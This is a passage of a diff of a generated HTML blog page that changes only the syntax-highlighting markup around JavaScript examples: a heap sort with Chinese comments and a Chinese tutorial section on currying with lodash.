-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> len;    <span style="color:#998;font-style:italic">//因为声明的多个函数都需要数据长度，所以把len设置成为全局变量
-</span><span style="color:#998;font-style:italic"></span>
-<span style="color:#000;font-weight:bold">function</span> buildMaxHeap(arr) {   <span style="color:#998;font-style:italic">//建立大顶堆
-</span><span style="color:#998;font-style:italic"></span>    len <span style="color:#000;font-weight:bold">=</span> arr.length;
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(len<span style="color:#000;font-weight:bold">/</span><span style="color:#099">2</span>); i <span style="color:#000;font-weight:bold">&amp;</span>gt;<span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i<span style="color:#000;font-weight:bold">--</span>) {
-        heapify(arr, i);
-    }
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">len</span><span class="p">;</span>    <span class="c1">//因为声明的多个函数都需要数据长度，所以把len设置成为全局变量
+</span><span class="c1"></span>
+<span class="kd">function</span> <span class="nx">buildMaxHeap</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">//建立大顶堆
+</span><span class="c1"></span>    <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">len</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span> <span class="nx">i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">heapify</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> heapify(arr, i) {     <span style="color:#998;font-style:italic">//堆调整
-</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> left <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>,
-        right <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">2</span>,
-        largest <span style="color:#000;font-weight:bold">=</span> i;
+<span class="kd">function</span> <span class="nx">heapify</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">//堆调整
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">left</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="nx">right</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span>
+        <span class="nx">largest</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
 
-    <span style="color:#000;font-weight:bold">if</span> (left <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[left] <span style="color:#000;font-weight:bold">&gt;</span> arr[largest]) {
-        largest <span style="color:#000;font-weight:bold">=</span> left;
-    }
+    <span class="k">if</span> <span class="p">(</span><span class="nx">left</span> <span class="o">&lt;</span> <span class="nx">len</span> <span class="o">&amp;&amp;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">left</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">largest</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nx">largest</span> <span class="o">=</span> <span class="nx">left</span><span class="p">;</span>
+    <span class="p">}</span>
 
-    <span style="color:#000;font-weight:bold">if</span> (right <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[right] <span style="color:#000;font-weight:bold">&gt;</span> arr[largest]) {
-        largest <span style="color:#000;font-weight:bold">=</span> right;
-    }
+    <span class="k">if</span> <span class="p">(</span><span class="nx">right</span> <span class="o">&lt;</span> <span class="nx">len</span> <span class="o">&amp;&amp;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">right</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">largest</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nx">largest</span> <span class="o">=</span> <span class="nx">right</span><span class="p">;</span>
+    <span class="p">}</span>
 
-    <span style="color:#000;font-weight:bold">if</span> (largest <span style="color:#000;font-weight:bold">!=</span> i) {
-        swap(arr, i, largest);
-        heapify(arr, largest);
-    }
-}
+    <span class="k">if</span> <span class="p">(</span><span class="nx">largest</span> <span class="o">!=</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">largest</span><span class="p">);</span>
+        <span class="nx">heapify</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">largest</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> swap(arr, i, j) {
-    <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[i];
-    arr[i] <span style="color:#000;font-weight:bold">=</span> arr[j];
-    arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
-}
+<span class="kd">function</span> <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">j</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">temp</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> heapSort(arr) {
-    buildMaxHeap(arr);
+<span class="kd">function</span> <span class="nx">heapSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">buildMaxHeap</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
 
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> arr.length<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>; i <span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span>; i<span style="color:#000;font-weight:bold">--</span>) {
-        swap(arr, <span style="color:#099">0</span>, i);
-        len<span style="color:#000;font-weight:bold">--</span>;
-        heapify(arr, <span style="color:#099">0</span>);
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">);</span>
+        <span class="nx">len</span><span class="o">--</span><span class="p">;</span>
+        <span class="nx">heapify</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="5-函数式编程">==5. 函数式编程==</h2>
@@ -1139,150 +1271,150 @@ f. 浏览器对页面进行渲染呈现给用户</p>
 </ul>
 <h2 id="6-函数式编程柯里化curry">==6. 函数式编程——柯里化（curry）==</h2>
 <p>curry 的概念很简单：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> add <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span>(x) {
-  <span style="color:#000;font-weight:bold">return</span> <span style="color:#000;font-weight:bold">function</span>(y) {
-    <span style="color:#000;font-weight:bold">return</span> x <span style="color:#000;font-weight:bold">+</span> y;
-  };
-};
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">add</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="kd">function</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">x</span> <span class="o">+</span> <span class="nx">y</span><span class="p">;</span>
+  <span class="p">};</span>
+<span class="p">};</span>
 
-<span style="color:#000;font-weight:bold">var</span> increment <span style="color:#000;font-weight:bold">=</span> add(<span style="color:#099">1</span>);
-<span style="color:#000;font-weight:bold">var</span> addTen <span style="color:#000;font-weight:bold">=</span> add(<span style="color:#099">10</span>);
+<span class="kd">var</span> <span class="nx">increment</span> <span class="o">=</span> <span class="nx">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">addTen</span> <span class="o">=</span> <span class="nx">add</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
 
-increment(<span style="color:#099">2</span>);
-<span style="color:#998;font-style:italic">// 3
-</span><span style="color:#998;font-style:italic"></span>
-addTen(<span style="color:#099">2</span>);
-<span style="color:#998;font-style:italic">// 12
+<span class="nx">increment</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="c1">// 3
+</span><span class="c1"></span>
+<span class="nx">addTen</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="c1">// 12
 </span></code></pre></td></tr></table>
 </div>
 </div><p>我们来创建一些 curry 函数享受下（译者注：此处原文是“for our enjoyment”，语出自圣经）</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> curry <span style="color:#000;font-weight:bold">=</span> require(<span style="color:#d14">&#39;lodash&#39;</span>).curry;
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">curry</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;lodash&#39;</span><span class="p">).</span><span class="nx">curry</span><span class="p">;</span>
 
-<span style="color:#000;font-weight:bold">var</span> match <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(what, str) {
-  <span style="color:#000;font-weight:bold">return</span> str.match(what);
-});
+<span class="kd">var</span> <span class="nx">match</span> <span class="o">=</span> <span class="nx">curry</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">what</span><span class="p">,</span> <span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">str</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">what</span><span class="p">);</span>
+<span class="p">});</span>
 
-<span style="color:#000;font-weight:bold">var</span> replace <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(what, replacement, str) {
-  <span style="color:#000;font-weight:bold">return</span> str.replace(what, replacement);
-});
+<span class="kd">var</span> <span class="nx">replace</span> <span class="o">=</span> <span class="nx">curry</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">what</span><span class="p">,</span> <span class="nx">replacement</span><span class="p">,</span> <span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">what</span><span class="p">,</span> <span class="nx">replacement</span><span class="p">);</span>
+<span class="p">});</span>
 
-<span style="color:#000;font-weight:bold">var</span> filter <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(f, ary) {
-  <span style="color:#000;font-weight:bold">return</span> ary.filter(f);
-});
+<span class="kd">var</span> <span class="nx">filter</span> <span class="o">=</span> <span class="nx">curry</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">f</span><span class="p">,</span> <span class="nx">ary</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">ary</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
+<span class="p">});</span>
 
-<span style="color:#000;font-weight:bold">var</span> map <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(f, ary) {
-  <span style="color:#000;font-weight:bold">return</span> ary.map(f);
-});
+<span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="nx">curry</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">f</span><span class="p">,</span> <span class="nx">ary</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">ary</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
+<span class="p">});</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>我在上面的代码中遵循的是一种简单，同时也非常重要的模式。即策略性地把要操作的数据（String， Array）放到最后一个参数里。到使用它们的时候你就明白这样做的原因是什么了。</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">match(<span style="color:#009926">/\s+/g</span>, <span style="color:#d14">&#34;hello world&#34;</span>);
-<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
-</span><span style="color:#998;font-style:italic"></span>
-match(<span style="color:#009926">/\s+/g</span>)(<span style="color:#d14">&#34;hello world&#34;</span>);
-<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
-</span><span style="color:#998;font-style:italic"></span>
-<span style="color:#000;font-weight:bold">var</span> hasSpaces <span style="color:#000;font-weight:bold">=</span> match(<span style="color:#009926">/\s+/g</span>);
-<span style="color:#998;font-style:italic">// function(x) { return x.match(/\s+/g) }
-</span><span style="color:#998;font-style:italic"></span>
-hasSpaces(<span style="color:#d14">&#34;hello world&#34;</span>);
-<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
-</span><span style="color:#998;font-style:italic"></span>
-hasSpaces(<span style="color:#d14">&#34;spaceless&#34;</span>);
-<span style="color:#998;font-style:italic">// null
-</span><span style="color:#998;font-style:italic"></span>
-filter(hasSpaces, [<span style="color:#d14">&#34;tori_spelling&#34;</span>, <span style="color:#d14">&#34;tori amos&#34;</span>]);
-<span style="color:#998;font-style:italic">// [&#34;tori amos&#34;]
-</span><span style="color:#998;font-style:italic"></span>
-<span style="color:#000;font-weight:bold">var</span> findSpaces <span style="color:#000;font-weight:bold">=</span> filter(hasSpaces);
-<span style="color:#998;font-style:italic">// function(xs) { return xs.filter(function(x) { return x.match(/\s+/g) }) }
-</span><span style="color:#998;font-style:italic"></span>
-findSpaces([<span style="color:#d14">&#34;tori_spelling&#34;</span>, <span style="color:#d14">&#34;tori amos&#34;</span>]);
-<span style="color:#998;font-style:italic">// [&#34;tori amos&#34;]
-</span><span style="color:#998;font-style:italic"></span>
-<span style="color:#000;font-weight:bold">var</span> noVowels <span style="color:#000;font-weight:bold">=</span> replace(<span style="color:#009926">/[aeiou]/ig</span>);
-<span style="color:#998;font-style:italic">// function(replacement, x) { return x.replace(/[aeiou]/ig, replacement) }
-</span><span style="color:#998;font-style:italic"></span>
